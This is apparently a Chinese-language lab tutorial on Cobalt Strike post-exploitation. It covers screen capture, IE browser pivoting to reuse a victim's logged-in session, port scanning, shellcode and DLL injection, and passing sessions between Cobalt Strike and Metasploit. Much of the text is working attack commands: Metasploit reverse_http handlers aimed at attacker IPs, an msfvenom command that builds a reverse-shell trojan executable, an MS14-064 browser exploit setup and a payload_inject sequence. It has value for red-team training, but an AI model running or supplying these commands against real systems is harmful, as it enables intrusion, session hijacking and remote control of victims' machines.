# 攻击

当我们拿到Victim的Beacon之后就要进行攻击，CS中提供了很多攻击模块，接下来介绍常见使用方法

![image-20211129161532099](https://image.3001.net/images/20211130/1638258992_61a5d930686c2d7e37917.png!small)

## 用户驱动攻击

### 用户截屏

在目标中选择屏幕截图即可获取截图，截图会在视图->屏幕截图中显示

![image-20211129161845795](https://image.3001.net/images/20211130/1638258993_61a5d931098a87f143216.png!small)

因为默认会话60秒返回一次，所以再执行操作60秒之后会得到截图，也可以右击会话->选择sleep设置会话时间间隔

![image-20211129162035538](https://image.3001.net/images/20211130/1638258993_61a5d9318cd0aa1cc8617.png!small)

右击选择进入Beacon，会出现一个beacon视图，视图中可以看到刚才执行的命令

![image-20211129162224469](https://image.3001.net/images/20211130/1638258994_61a5d9323b32b451dcf7e.png!small)

### 进程管理

也可以在进程列表中选择进程截图（汉化版有问题）

![image-20211129162747452](https://image.3001.net/images/20211130/1638258994_61a5d932f41ad05854399.png!small)

可以选择进程后对其进行下面工具栏中的操作

 **任务处理**

    
    
    jobs查看任务列表
    jobkill <jid>终止一个任务
    

进行的任务可以在beacon中使用`jobs`命令查看

![image-20211129163315715](https://image.3001.net/images/20211130/1638258995_61a5d9339fa76d72e4cca.png!small)

使用`jobkill 1`将其kill

### 文件管理

没什么好说的

![image-20211129163706278](https://image.3001.net/images/20211130/1638258996_61a5d9341a2e90f9c1e2e.png!small)

之后操作后可以在beacon看到执行状态（权限不够的话无法上传）

![image-20211129163913162](https://image.3001.net/images/20211130/1638258996_61a5d934bb40cd85c8be3.png!small)

输入`pwd`命令可以查看当前目录

### 远程VNC

> VNC，为一种使用RFB协议的屏幕画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的屏幕画面。
> VNC与操作系统无关，因此可跨平台使用

![image-20211129165111649](https://image.3001.net/images/20211130/1638258997_61a5d93547fedeac34153.png!small)

### 浏览器代理

只针对IE，其他浏览器无效

如果目标及其使用ie浏览器登录网站，启动浏览器后Hacker将可以用Victim的登录状态登录

比如Victim使用ie浏览器登录网站

    
    
    http://10.242.197.249/CMS/_Common/xhcms/admin/?r=login
    

![image-20211129170901878](https://image.3001.net/images/20211130/1638258997_61a5d935ce45da3d57871.png!small)

CS开启浏览器代理

![image-20211129171414712](https://image.3001.net/images/20211130/1638258998_61a5d9367b4a1a9073291.png!small)

开启状态可以在beacon中看到，框中的IP端口就是代理IP

![image-20211129171445812](https://image.3001.net/images/20211130/1638258999_61a5d9372d4c02ae390c2.png!small)

将IP设置为Hacker主机的浏览器的代理

![image-20211129172037118](https://image.3001.net/images/20211130/1638258999_61a5d9379faccc1834b41.png!small)

然后Hacker使用浏览器访问页面，成功使用Victim的登录状态登录

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-IsUHq9jq-1638258759698)(https://gitee.com/q_one/oceanpic/raw/master/img2021-12/202111301550710.gif)]

使用命令`browserpivot stop`停止浏览器代理

    
    
    browserpivot stop
    

### 用户发现&端口扫描

 **用户发现**

    
    
    net view
    

**端口扫描**

    
    
    help portscan
    Use: portscan [targets] [ports] [arp|icmp|none] [max connections]
    

也可以直接右击->选择端口扫描

在视图->目标中可以看到扫描结果

![image-20211129210214665](https://image.3001.net/images/20211130/1638259000_61a5d9382ae521a2490a5.png!small)

### 视图

**![image-20211129210440645](https://image.3001.net/images/20211130/1638259000_61a5d938dfd057cb1a908.png!small)**

## 会话管理

 **会话派生(传递)使用场景**

  1. 将当前会话传递至其他CS团队服务器中，直接右击`spawn`选择要传递的监听器即可

  2. 将当前会话传递至MSF中联动

### 会话传递相关命令

Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。

`spawn`：进行会话的传递，也可直接右击会话选择`spawn`命令进行会话的选择。默认情况下，`spawn`命令会在 rundll32.exe
中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用`spawnto`命令来说明在派生新会话时候会使用
Beacon 中的哪个程序

`spawnto`：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入`spawnto`命令然后按 enter 会指示
Beacon 恢复至其默认行为

`inject`：输入`inject + 进程 id + 监听器名`来把一个会话注入一个特定的进程中。使用 ps
命令来获取一个当前系统上的进程列表。使用`inject [pid] x64`来将一个64位 Beacon 注入到一个 64位进程中

`spawn`和`inject`命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或
DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的
Beacon，这些命令会自动地尝试连接到并控制这些 payload。

`dllinject`：`dllinject + [pid]`来将一个反射性 DLL 注入到一个进程中

`shinject`：使用`shinject [pid] [架构] [/路径/.../file.bin]`命令来从一个本地文件中注入 shellcode
到一个目标上的进程中。

`shspawn`：使用`shspawn [架构] [/路径/.../file.bin]`命令会先派生一个新进程（这个新进程是 spawn to
命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中

`dllload`：使用`dllload [pid] [c:\路径\...\file.dll]`来在另一个进程中加载磁盘上的 DLL文件

### CS派生会话

环境：

Name| System| IP  
---|---|---  
TeamServer1| Kali| 192.168.179.128  
TeamServer2&MSF| Kali| 192.168.179.138  
Victim1| Winserver2008| 192.168.179.148  
  
CS新建连接

![image-20211129213257264](https://image.3001.net/images/20211130/1638259001_61a5d939767eeb55747f1.png!small)

自身增加会话或者在其他的 teamserver 做备份会话

 **自身增加会话**

![image-20211129213827561](https://image.3001.net/images/20211130/1638259002_61a5d93a0f63e4a392fb9.png!small)

选择choose，稍等很快就添加了一个会话

![image-20211129213902713](https://image.3001.net/images/20211130/1638259002_61a5d93acdf6f3269c97e.png!small)

注意：派生出来的会话，进程为rundll32.exe，原来的是powershell

 **派生到其他的 teamserver 做备份会话**

从192.168.179.128这个备份到192.168.179.138这个TeamServer

首先需要在被派生Client中新建一个Listener

![image-20211129214353716](https://image.3001.net/images/20211130/1638259003_61a5d93b4265cb15504dc.png!small)

在原Client中选择需要派生的会话，右击选择派生

选择刚才创建的Listener

![image-20211129214515784](https://image.3001.net/images/20211130/1638259003_61a5d93be27ba180334dc.png!small)

稍等片刻

![image-20211129214851662](https://image.3001.net/images/20211130/1638259004_61a5d93cdea089a552ad5.png!small)

这两个派生出来的会话，进程都为rundll32.exe

### CS派生MSF会话

首先在MSF(IP:192.168.179.138)中创建监听端口

    
    
    use exploit/multi/handler 
    set payload windows/meterpreter/reverse_http #cs4.0后使用Http
    set lhost 192.168.179.128
    set lport 23333
    exploit -j 
    # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)
    其他命令
    jobs  查看后台攻击任务 
    kill <id>  停止某后台攻击任务 
    sessions -l  (查看会话)
    sessions -i 2   选择会话
    sessions -k 2   结束会话
    

在CS中新建一个Foreign Listener

![image-20211129220225077](https://image.3001.net/images/20211130/1638259005_61a5d93d8952b64512ecb.png!small)

CS中选择会话->派生选择对应Listener，选择后MSF就可以收到Session

![image-20211129222512696](https://image.3001.net/images/20211130/1638259006_61a5d93e26f3269f32951.png!small)

 **问题解决**

因为我使用的CS版本为4.1，Foreign只剩下Http和Https，MSF
pyload为windows/foreign/reverse_tcp时会出现以下错误

![image-20211129221322889](https://image.3001.net/images/20211130/1638259007_61a5d93f0bd2e8fd97717.png!small)

原因：因为cs设置的payload是windows/foreign/reverse_http，但是msf这边设置的是windows/foreign/reverse_tcp，这两个协议不相同，不可以通信，CS新版中又没有TCP，

解决：将msf设置的payload为window/foreign/reverse_http，再次从cs派生shell，可以拿到meterpreter
shell，旧版CS可以使用Tcp

### MSF木马->CS会话

1.CS创建HTTP Beacon Listener

![image-20211130145156691](https://image.3001.net/images/20211130/1638259007_61a5d93fbde59d1e1c259.png!small)

2.在Kali中执行以下命令，MSF生成木马

    
    
    sfvenom -p windows/meterpreter/reverse_http LHOST=192.168.179.128 LPORT=8808 -f exe > /tmp/shell1.exe
    
    # 此处的host为TeamServer IP、端口为Listener设置的端口
    

![image-20211130145114135](https://image.3001.net/images/20211130/1638259008_61a5d9407e032ac6310cc.png!small)

3.生成的木马文件通过漏洞，上传到目标靶机并执行

![image-20211130145418585](https://image.3001.net/images/20211130/1638259009_61a5d9410e2808b62baac.png!small)

上线CS，Process为shell1.exe

### MSFexp->CS会话

和msf木马添加至cs会话一致，只需要在msf设置payload时，将lhost和lport设置为cs http监听器即可

    
    
    use exploit/windows/browser/ms14_064_ole_code_execution
    set srvhost 192.168.0.134
    set SRVPORT 80
    set payload windows/meterpreter/reverse_http
    set LHOST 192.168.0.104
    set lport 8888
    set disablepayloadhandler True
    set PrependMigrate true
    set lhost 80
    exploit
    # 攻击之后会生成url
    set disablepayloadhandler True
    # 将DisablePayLoadHandler设置为true。这告诉metasploit框架，它不需要在metasploit框架内创建处理程序来服务有效负载连接。
    set PrependMigrate true
    

因为msf使用的payload是浏览器exp，当xp系统的受害人用浏览器访问http://192.168.0.134:80/1Gk97z32pr
这个带有攻击代码的链接时候，成功的话就会在cobalt strike 产生一个会话

### MSFsession派生到CS

1.首先msf中需要有session

![image-20211130153607651](https://image.3001.net/images/20211130/1638259009_61a5d941b24e0ce8ca603.png!small)

2.cs新建Listener

![image-20211130154226972](https://image.3001.net/images/20211130/1638259010_61a5d9426115f5f619612.png!small)

3.msf 使用以下模块

    
    
    msf5> use exploit/windows/local/payload_inject
    set payload windows/meterpreter/reverse_http
    set session 7
    set lhost 192.168.179.128
    # IP是CS TeamServer ip
    set lport 8888
    # port是CS Listener port
    set DisablePayloadHandler true
    exploit -j
    

![image-20211130154539464](https://image.3001.net/images/20211130/1638259010_61a5d942e8eb31a0ff476.png!small)  
同样要注意是http协议

